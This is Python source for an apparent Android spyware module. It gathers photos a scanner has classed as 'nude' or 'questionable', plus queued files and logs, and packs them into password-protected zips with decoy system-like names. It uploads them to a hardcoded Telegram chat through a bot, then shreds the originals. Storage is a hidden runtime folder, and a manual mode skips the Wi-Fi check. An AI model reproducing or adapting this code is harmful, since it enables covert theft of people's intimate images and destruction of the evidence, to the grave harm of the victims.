# -*- coding: utf-8 -*-
import os
import time
import random
import threading
import logging
import gc
import string
import shutil
from datetime import datetime

# ========== إعداد المسارات ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
H = os.path.join(P, "harvest")               # المجلد النهائي للملفات المضغوطة
PENDING = os.path.join(H, "pending_upload")  # مجلد انتظار التأكيد (احتياطي)
QUEUE = os.path.join(P, "harvest_queue")     # مجلد مؤقت للصور قبل الضغط

for d in [P, H, PENDING, QUEUE]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(filename=os.path.join(P, "z.log"), level=logging.ERROR, filemode='a')

# ========== المكتبات ==========
try:
    import pyzipper
    HAS_PYZIP = True
except ImportError:
    HAS_PYZIP = False

try:
    from jnius import autoclass
    JNI_AVAILABLE = True
except:
    JNI_AVAILABLE = False


class DailyZipper:
    def __init__(self, scanner=None, tg=None):
        self.sc = scanner
        self.tg = tg
        self.pw = getattr(tg.m, 'pw', 'Zaen123@123@') if tg else 'Zaen123@123@'
        self.max_b = 48 * 1024 * 1024   # 48MB (آمن تحت حد 50MB)
        self.active = False

    # ========== توليد اسم ملف وهمي ==========
    def _gen_name(self):
        prefixes = ["cache_", "sys_upd_", "tmp_vol_", "core_st_", "db_sync_"]
        chars = string.ascii_letters + string.digits
        suffix = ''.join(random.choices(chars, k=8))
        return f"{random.choice(prefixes)}{suffix}.zip"

    # ========== إتلاف الملف (كتابة عشوائية + حذف) ==========
    def _shred(self, path):
        try:
            if os.path.exists(path):
                sz = os.path.getsize(path)
                if sz > 0:
                    chunk = 4096
                    with open(path, "ba+", buffering=0) as f:
                        for _ in range(0, sz, chunk):
                            f.write(os.urandom(min(chunk, sz)))
                        f.flush()
                        os.fsync(f.fileno())
                os.remove(path)
        except:
            pass

    # ========== التحقق من الاتصال عبر Wi-Fi ==========
    def _is_on_wifi(self):
        if not JNI_AVAILABLE:
            return True
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            cm = ctx.getSystemService("connectivity")
            n = cm.getActiveNetworkInfo()
            return n and n.isConnected() and n.getType() == 1  # TYPE_WIFI = 1
        except:
            return True

    # ========== إرسال آمن مع إعادة محاولة ==========
    def _safe_send(self, zip_path, caption):
        delays = [2, 4, 8]
        for delay in delays:
            try:
                with open(zip_path, 'rb') as fobj:
                    target = getattr(self.tg, 'dat', -1003787520015)
                    resp = self.tg._api("sendDocument",
                                        {"chat_id": target, "caption": caption},
                                        {"document": fobj})
                if resp and resp.get('ok'):
                    return True
            except Exception as e:
                logging.error(f"Send error: {e}")
            time.sleep(delay)
        return False

    # ========== الإرسال الفوري اليدوي (يتجاوز شرط WiFi) ==========
    def force_send_now(self, chat_id=None):
        """
        إرسال فوري يدوي:
        1. يجمع كل الملفات من QUEUE و PENDING.
        2. يضغطها فوراً (يُتجاوز شرط WiFi).
        3. يرسلها إلى الخزنة ويُبلغ المستخدم بالنتيجة.
        """
        if self.active:
            if chat_id:
                self.tg._api("sendMessage", {"chat_id": chat_id, "text": "⏳ عملية حصاد جارية بالفعل، انتظر قليلاً..."})
            return

        # جمع الملفات من مجلدي الانتظار
        files_to_pack = []
        for folder in [QUEUE, PENDING]:
            if os.path.exists(folder):
                for f in os.listdir(folder):
                    path = os.path.join(folder, f)
                    if os.path.isfile(path):
                        files_to_pack.append(path)

        if not files_to_pack:
            if chat_id:
                self.tg._api("sendMessage", {"chat_id": chat_id, "text": "📭 لا توجد ملفات جديدة للحصاد حالياً."})
            return

        if chat_id:
            self.tg._api("sendMessage", {"chat_id": chat_id, "text": f"🚀 جاري معالجة {len(files_to_pack)} ملفاً وإرسالهم..."})

        # تشغيل الضغط والإرسال في خيط منفصل (مع تجاوز WiFi)
        threading.Thread(target=self._pack_and_ship, args=(files_to_pack, True, chat_id), daemon=True).start()

    # ========== الضغط والإرسال (داخلي) ==========
    def _pack_and_ship(self, files, bypass_wifi=False, report_id=None):
        if not files or self.active:
            return
        if not HAS_PYZIP:
            logging.error("pyzipper missing. Cannot encrypt.")
            return
        if not bypass_wifi and not self._is_on_wifi():
            logging.info("Not on WiFi, skipping automatic harvest.")
            return

        self.active = True

        # تقسيم الملفات إلى دفعات حسب الحجم
        batches = []
        cur_batch, cur_size = [], 0
        for f in files:
            if not os.path.exists(f):
                continue
            try:
                fsz = os.path.getsize(f)
                if cur_size + fsz > self.max_b:
                    if cur_batch:
                        batches.append(cur_batch)
                    cur_batch, cur_size = [], 0
                cur_batch.append(f)
                cur_size += fsz
            except:
                continue
        if cur_batch:
            batches.append(cur_batch)

        # معالجة كل دفعة
        for idx, batch in enumerate(batches):
            zip_name = self._gen_name()
            zip_path = os.path.join(H, zip_name)

            try:
                with pyzipper.AESZipFile(zip_path, 'w',
                                         compression=pyzipper.ZIP_DEFLATED,
                                         encryption=pyzipper.WZ_AES) as zf:
                    zf.setpassword(self.pw.encode('utf-8'))
                    for f in batch:
                        zf.write(f, os.path.basename(f))

                caption = f"📦 {'إرسال فوري' if bypass_wifi else 'حصاد تلقائي'} | دفعة {idx+1}/{len(batches)}"
                success = self._safe_send(zip_path, caption)

                if success:
                    for f in batch:
                        self._shred(f)
                    if report_id:
                        self.tg._api("sendMessage", {"chat_id": report_id, "text": f"✅ تم إرسال الدفعة {idx+1} بنجاح"})
                else:
                    if report_id:
                        self.tg._api("sendMessage", {"chat_id": report_id, "text": f"❌ فشل إرسال الدفعة {idx+1}"})

            except Exception as e:
                logging.error(f"Packing error: {e}")
                if report_id:
                    self.tg._api("sendMessage", {"chat_id": report_id, "text": f"⚠️ خطأ في الضغط: {str(e)[:100]}"})
            finally:
                if os.path.exists(zip_path):
                    os.remove(zip_path)

            # تأخير بسيط بين الدفعات (لتجنب حظر Telegram)
            if idx < len(batches) - 1:
                time.sleep(5)

        self.active = False
        gc.collect()

        if report_id:
            self.tg._api("sendMessage", {"chat_id": report_id, "text": "🏁 انتهت عملية الإرسال الفوري."})

    # ========== الحصاد التلقائي (يُستدعى من monitor) ==========
    def run(self):
        """جمع الملفات المصنفة (nude/questionable) وإضافة ملفات QUEUE ثم الضغط والإرسال"""
        if self.active or not self._is_on_wifi():
            return

        all_files = []

        # 1. جلب الملفات المصنفة من MediaScanner
        if self.sc:
            try:
                for cat in ["nude", "questionable"]:
                    items = self.sc.get_gallery_by_category(cat, limit=150)
                    all_files.extend([i["path"] for i in items if "path" in i])
            except Exception as e:
                logging.error(f"Scanner error: {e}")

        # 2. إضافة الملفات الموجودة في مجلد QUEUE (إن وجدت)
        if os.path.exists(QUEUE):
            for f in os.listdir(QUEUE):
                path = os.path.join(QUEUE, f)
                if os.path.isfile(path):
                    all_files.append(path)

        # 3. إضافة السجلات الكبيرة (>100KB)
        try:
            for f in os.listdir(P):
                if f.endswith(".log") and f not in ["z.log", "t.log"]:
                    path = os.path.join(P, f)
                    if os.path.exists(path) and os.path.getsize(path) > 100 * 1024:
                        all_files.append(path)
        except Exception as e:
            logging.error(f"Logs error: {e}")

        if all_files:
            # إشعار بالتجميع (اختياري)
            if self.tg and hasattr(self.tg, 'notify_harvest'):
                try:
                    did = getattr(self.sc, 'did', 'Unknown')
                    self.tg.notify_harvest(did, len(all_files))
                except:
                    pass
            # تشغيل الضغط والإرسال بدون تجاوز WiFi (تلقائي)
            threading.Thread(target=self._pack_and_ship, args=(all_files, False, None), daemon=True).start()


# ========== دالة المصنع ==========
def create(scanner=None, telegram=None):
    return DailyZipper(scanner, telegram)
